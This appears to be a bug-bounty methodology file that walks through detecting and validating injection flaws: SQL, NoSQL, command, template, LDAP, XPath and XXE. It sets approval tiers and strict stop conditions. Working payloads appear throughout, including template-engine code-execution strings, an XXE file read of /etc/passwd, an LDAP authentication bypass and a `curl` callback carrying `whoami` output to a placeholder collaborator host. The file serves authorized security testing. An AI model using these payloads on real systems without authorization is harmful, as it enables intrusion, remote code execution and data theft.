# Injection Attacks — Complete Methodology

**status:** active
**risk:** L0 (detection) – L2 (validation)
**approval:** L2 requires explicit approval
**program_types:** [web2, api]
**source:** reviewed from yaklang/hack-skills, BugBountySkills, OWASP Testing Guide, recon bundle

## SQL Injection

### Detection (L0)
- Submit `'` `"` `\` — observe errors, response differences, or timing
- Compare `?id=1` vs `?id=2-1` vs `?id=1' AND '1'='1` vs `?id=1' AND '1'='2`
- Test numeric vs string context: `?id=1` vs `?id=1a`
- Check for stacked queries: `; SELECT 1--`
- Boolean-based: `AND 1=1` vs `AND 1=2` — response diff?

### Validation (L2 — approval required)
- **Time-based (safest):** `SLEEP(5)` equivalent. STOP after confirming delay.
- **Error-based:** trigger single distinguishable error. STOP.
- **Out-of-band:** DNS/HTTP callback to your infrastructure.
- **NEVER:** `UNION SELECT` for data enumeration without additional approval.
- **NEVER:** `sqlmap --dump` without explicit separate approval.

### Database-Specific
- MySQL: `SLEEP(5)`, `@@version`, `LOAD_FILE()`
- PostgreSQL: `pg_sleep(5)`, `version()`, `COPY ... TO`
- MSSQL: `WAITFOR DELAY '0:0:5'`, `@@version`, `xp_cmdshell` (RCE — extreme caution)
- Oracle: `DBMS_LOCK.SLEEP(5)`, `v$version`, `UTL_HTTP`
- SQLite: `randomblob(100000000)` (CPU time), `sqlite_version()`

## NoSQL Injection

### MongoDB
- `$ne`: `{"username": {"$ne": ""}, "password": {"$ne": ""}}`
- `$regex`: `{"username": {"$regex": "^admin"}}`
- `$gt`: `{"price": {"$gt": 0}}`
- `$where`: `{"$where": "sleep(5000)"}`

### Redis
- Command injection via `SLAVEOF`, `CONFIG SET`, `MODULE LOAD`
- CRLF in protocol: `\r\n` in value parameters

## Command Injection

### Detection (L0)
- Separators: `;` `|` `||` `&&` `&` `\n` `%0a`
- Subshells: `` ` `` `$()` 
- Newline: `%0a` in URL parameters

### Validation (L2 — approval required)
- **Time-based:** `sleep 5` / `timeout /t 5`. STOP after confirming delay.
- **Output-based:** `id` / `whoami`. STOP after one command.
- **Out-of-band:** `curl http://your-collaborator/$(whoami)`.
- **NEVER:** reverse shell, file upload, lateral movement.

## Template Injection (SSTI)

### Detection
- Math tests: `{{7*7}}` → 49? (Jinja2/Twig), `${7*7}` → 49? (FreeMarker), `<%= 7*7 %>` → 49? (ERB)
- Object introspection: `{{config}}`, `{{self}}`, `{{''.__class__}}`

### Engine-Specific
- **Jinja2 (Python):** `{{''.__class__.__mro__[1].__subclasses__()}}`
- **Twig (PHP):** `{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}`
- **FreeMarker (Java):** `${"freemarker.template.utility.Execute"?new()("id")}`
- **Velocity (Java):** `#set($x='')$x.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')`

### STOP after:
- Confirming the engine with a math expression
- NEVER execute commands until you've confirmed SSTI with math

## LDAP Injection

### Detection
- `*` returns all — does it change results?
- `(` `)` `&` `|` `!` — filter operators causing errors?

### Validation (L2)
- Blind: `*)(uid=*))(|(uid=*` — authentication bypass?
- STOP after confirming with one payload. Never enumerate full directory.

## XPath Injection

### Detection
- `' or '1'='1` — returns all nodes?
- `' or true() or '` — boolean bypass?

## XXE (XML External Entity)

### Detection
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### Validation (L2)
- File read: `file:///etc/hostname` (not passwd for proof — less sensitive)
- Out-of-band: `<!ENTITY xxe SYSTEM "http://your-collaborator/xxe">`
- STOP after confirming file read or out-of-band interaction

## Stop Conditions (all injections)

1. **Confirm the vector** with minimal, harmless payload
2. **STOP immediately** — never chain, pivot, or escalate
3. **Document the proof** — one error, one delay, one callback
4. **Never extract data** beyond what's needed for the vulnerability class proof
